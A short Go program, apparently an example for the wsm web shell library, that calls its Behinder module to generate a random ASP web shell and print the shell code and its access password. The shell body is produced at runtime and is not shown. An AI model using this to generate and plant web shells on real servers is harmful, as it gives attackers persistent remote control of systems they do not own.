package main

import (
	"fmt"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
)

func main() {
	pass, c := behinder.GenRandShell(shell.AspScript)
	fmt.Println(pass)
	fmt.Println(c)
}
